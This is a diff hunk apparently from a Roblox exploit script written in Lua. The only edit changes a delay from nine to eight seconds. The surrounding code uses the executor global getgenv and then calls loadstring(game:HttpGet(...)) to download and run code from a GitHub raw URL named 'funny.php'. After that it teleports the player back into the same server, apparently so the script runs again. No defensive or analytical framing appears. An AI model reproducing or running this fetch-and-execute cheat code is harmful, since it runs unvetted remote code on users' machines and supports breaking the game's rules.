@@ -7,7 +7,7 @@ prompt.ChildAdded:Connect(function(child)
     	getgenv().skid = "ballas"
     	wait(1)
     	print("1")
-	    wait(9)
+	    wait(8)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/qcox/gothoes/main/funny.php",true))()
         ]])
         game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
